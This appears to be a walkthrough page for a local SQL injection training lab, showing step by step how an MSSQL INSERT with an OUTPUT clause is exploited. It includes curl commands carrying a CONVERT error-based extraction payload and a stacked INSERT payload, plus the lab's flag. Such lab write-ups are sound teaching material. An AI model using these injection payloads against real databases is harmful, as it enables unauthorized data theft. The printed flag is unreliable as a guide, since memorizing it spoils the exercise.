<h4>Step 1: Understand the INSERT + OUTPUT Statement</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Feedback Submission</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=testuser" --data-urlencode "comment=hello world"<br><br>
        <span class="prompt">Name: </span>testuser<br>
        <span class="prompt">Comment: </span>hello world<br>
        <span class="prompt">SQL: </span>INSERT INTO feedback (author, comment) OUTPUT INSERTED.id, INSERTED.author, INSERTED.comment VALUES ('testuser', 'hello world')<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Feedback saved! (ID: 16)</strong><br>
        Author: testuser. Comment: hello world
    </div>
</div>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" --data-urlencode "comment='"<br><br>
        <span class="prompt">Name: </span>test<br>
        <span class="prompt">Comment: </span>'<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: Unclosed quotation mark after the character string '')'.</strong>
    </div>
</div>

<h4>Step 3: Error-Based Extraction via Value Concatenation</h4>
<p>MSSQL uses <code>+</code> for string concatenation. Inject a CONVERT error into the value:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CONVERT Error Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
        &nbsp;&nbsp;--data-urlencode "comment=' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '"<br><br>
        <span class="prompt">Name: </span>test<br>
        <span class="prompt">Comment: </span>' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_1ns3rt_0utput_cl4us3}' to data type int.</strong>
    </div>
</div>

<h4>Step 4: Stacked INSERT. Write Flag to Feedback</h4>
<p>Close the INSERT, then insert a new row with the flag value:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Stacked INSERT</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
        &nbsp;&nbsp;--data-urlencode "comment=test'); INSERT INTO feedback (author, comment) SELECT 'LEAKED', flag FROM flags; -- -"<br><br>
        <span class="prompt">Name: </span>test<br>
        <span class="prompt">Comment: </span>test'); INSERT INTO feedback (author, comment) SELECT 'LEAKED', flag FROM flags; -- -<br><br>
        <span class="prompt">Result: </span><strong>Feedback saved! (ID: 17)</strong><br>
        Author: test. Comment: test<br>
        <span class="prompt">// Check the "Recent Feedback" list:</span><br>
        <strong>#18 LEAKED:</strong> FLAG{ms_1ns3rt_0utput_cl4us3}
    </div>
</div>

<h4>Step 5: OUTPUT vs RETURNING Comparison</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Cross-Database Comparison</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">MSSQL:      </span>INSERT INTO t (col) OUTPUT INSERTED.* VALUES (...)<br>
        <span class="prompt">PostgreSQL: </span>INSERT INTO t (col) VALUES (...) RETURNING *<br>
        <span class="prompt">MySQL:      </span>No equivalent (use LAST_INSERT_ID())<br><br>
        <span class="prompt">// OUTPUT works with INSERT, UPDATE, DELETE, and MERGE:</span><br>
        <span class="prompt">UPDATE:     </span>OUTPUT INSERTED.col (new), DELETED.col (old)<br>
        <span class="prompt">DELETE:     </span>OUTPUT DELETED.col
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{ms_1ns3rt_0utput_cl4us3}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab16" \<br> --data-urlencode "name=test" \<br>
        &nbsp;&nbsp;--data-urlencode "comment=' + CONVERT(VARCHAR, CONVERT(INT, (SELECT TOP 1 flag FROM flags))) + '"<br><br>
        <span class="prompt">Output: </span><strong>MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_1ns3rt_0utput_cl4us3}' to data type int.</strong>
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL's <code>OUTPUT</code> clause is unique: it returns data
    from affected rows during INSERT, UPDATE, DELETE, and MERGE. When injection occurs in an INSERT
    with OUTPUT, the returned data confirms successful insertion. Combined with stacked queries,
    INSERT injection becomes a powerful exfiltration vector: insert stolen data into visible tables.
    Parameterize all INSERT statements, especially those using OUTPUT.
</div>
